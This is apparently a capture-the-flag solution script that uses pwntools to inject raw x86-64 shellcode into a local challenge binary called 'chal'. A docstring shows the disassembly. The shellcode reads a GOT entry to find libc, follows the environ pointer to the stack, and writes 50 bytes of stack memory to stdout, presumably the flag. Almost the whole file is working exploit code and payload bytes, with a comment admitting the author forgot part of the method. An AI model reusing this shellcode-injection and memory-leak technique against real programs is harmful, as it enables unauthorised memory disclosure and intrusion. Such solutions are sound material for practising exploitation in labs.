from pwn import *

elf = ELF('./chal')

p = process(elf.path)

p.recvuntil(b"> ")


"""

Exploit GOT entry to leak libc then leak environ pointer to get stack address and then i don't remember lol

0x0000000000000000:  CC                      int3    
0x0000000000000001:  48 C7 C7 48 40 40 00    mov     rdi, 0x404048
0x0000000000000008:  48 8B 3F                mov     rdi, qword ptr [rdi]
0x000000000000000b:  48 81 C7 80 FE 20 00    add     rdi, 0x20fe80
0x0000000000000012:  48 8B 3F                mov     rdi, qword ptr [rdi]
0x0000000000000015:  48 81 EF 48 01 00 00    sub     rdi, 0x148
0x000000000000001c:  48 8B 37                mov     rsi, qword ptr [rdi]
0x000000000000001f:  48 C7 C7 01 00 00 00    mov     rdi, 1
0x0000000000000026:  48 C7 C0 01 00 00 00    mov     rax, 1
0x000000000000002d:  48 C7 C2 32 00 00 00    mov     rdx, 0x32
0x0000000000000034:  0F 05                   syscall 
"""


p.sendline(b"\xcc\x48\xc7\xc7\x48\x40\x40\x00\x48\x8b\x3f\x48\x81\xc7\x80\xfe\x20\x00\x48\x8b\x3f\x48\x81\xef\x48\x01\x00\x00\x48\x8b\x37\x48\xc7\xc7\x01\x00\x00\x00\x48\xc7\xc0\x01\x00\x00\x00\x48\xc7\xc2\x32\x00\x00\x00\x0f\x05")


p.interactive()
